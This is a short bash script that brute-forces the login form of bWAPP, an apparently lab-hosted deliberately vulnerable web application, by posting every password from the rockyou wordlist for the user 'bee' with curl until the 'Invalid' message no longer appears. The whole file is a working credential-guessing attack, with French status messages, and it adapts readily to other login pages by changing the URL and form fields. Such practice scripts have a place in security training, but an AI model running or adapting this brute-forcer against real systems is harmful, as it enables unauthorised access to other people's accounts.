#!/bin/bash

if [ -z $1 ];then
        WORDLIST="/usr/share/wordlists/rockyou.txt"
else
        WORDLIST=$1
fi

for pass in $(cat $WORDLIST);
do
	if curl http://192.168.12.240/bWAPP/login.php -X POST -d "security_level=0&form=submit&login=bee&password=$pass" -s -L | grep "Invalid" -q ;then
		echo "Mauvais password ! $pass "
	else
		echo "Password found ! : $pass"
		exit 0
	fi
done